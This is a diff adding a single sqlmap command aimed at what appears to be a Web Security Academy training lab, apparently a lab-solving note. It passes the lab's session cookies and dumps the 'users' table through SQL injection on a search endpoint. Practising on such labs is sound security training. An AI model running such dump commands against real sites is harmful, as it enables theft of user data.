@@ -1,0 +1,3 @@
+sqlmap -u "https://0aa800f2035fc12b83b2c802003f00fe.web-security-academy.net/advanced_search?organize_by=1&SearchTerm=test&blogArtist=Si+Test" \
+  --cookie="_lab=46%7cMCwCFHsL8Z3BK0Xh2XEdE9CLFaU6Z%2brLAhRnvoPJt4LAP%2bTWIOrTq3vih9iLngAyKY1z8umiVvu%2f7Z4O%2blMkzTbF7Tm35EEopkod5Qj6g%2f3y2Ozp2EHYsqclJhYmzakP8T69Q9aXUN4yQEWUbofaQIHWBBmUmLZNejtu2EX6RjO6D2o%3d; session=QcgCjFwe5pFILxUl4ZEOhhFb6HpRhuit" \
+  --columns -T users -D public --dump --batch
